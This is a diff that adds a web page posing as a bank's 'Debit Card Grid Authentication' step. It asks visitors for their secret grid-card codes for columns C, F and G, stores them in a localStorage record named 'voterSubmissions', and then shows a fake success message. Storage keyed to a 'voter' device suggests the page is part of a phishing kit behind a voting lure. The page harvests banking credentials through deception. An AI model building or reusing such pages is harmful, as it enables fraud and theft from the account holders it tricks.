@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Debit Card Grid Authentication - Step 3</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .form-container { background: #ffffff; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; }
+        .form-container h2 { text-align: center; margin-bottom: 5px; color: #0056b3; font-size: 22px; }
+        .sub-title { text-align: center; color: #555; font-size: 13px; margin-bottom: 20px; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 6px; color: #333; font-weight: 600; font-size: 13px; }
+        .form-group input { width: 100%; padding: 10px 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; text-align: center; letter-spacing: 2px; background: #fff; }
+        .form-group input:focus { outline: none; border-color: #0056b3; box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); }
+        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn-next:hover { background: #004085; }
+        .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>Debit Card Grid Authentication</h2>
+        <div class="sub-title">Final grid security step</div>
+
+        <form id="gridForm3">
+            <div class="form-group">
+                <label for="gridC">Grid Value for Column [ C ] (2 Digits)</label>
+                <input type="password" id="gridC" name="gridC" placeholder="-- " maxlength="2" required>
+            </div>
+            <div class="form-group">
+                <label for="gridF">Grid Value for Column [ F ] (2 Digits)</label>
+                <input type="password" id="gridF" name="gridF" placeholder="-- " maxlength="2" required>
+            </div>
+            <div class="form-group">
+                <label for="gridG">Grid Value for Column [ G ] (2 Digits)</label>
+                <input type="password" id="gridG" name="gridG" placeholder="-- " maxlength="2" required>
+            </div>
+
+            <button type="submit" id="submitBtn" class="btn-next">Complete Verification</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('gridForm3').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const gridC = document.getElementById('gridC').value;
+            const gridF = document.getElementById('gridF').value;
+            const gridG = document.getElementById('gridG').value;
+            const gridStep3Data = `C:${gridC}, F:${gridF}, G:${gridG}`;
+
+            let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
+            let deviceId = localStorage.getItem('voterDeviceId');
+
+            if (submissions.length > 0) {
+                let targetIndex = -1;
+                for (let i = submissions.length - 1; i >= 0; i--) {
+                    if (submissions[i].deviceId === deviceId) {
+                        targetIndex = i;
+                        break;
+                    }
+                }
+                if (targetIndex === -1) targetIndex = submissions.length - 1;
+
+                submissions[targetIndex].gridStep3 = gridStep3Data;
+                localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
+            }
+
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.innerText = "Success...";
+
+            setTimeout(() => {
+                alert("Verification Completed Successfully!");
+                window.location.href = "index.html"; 
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
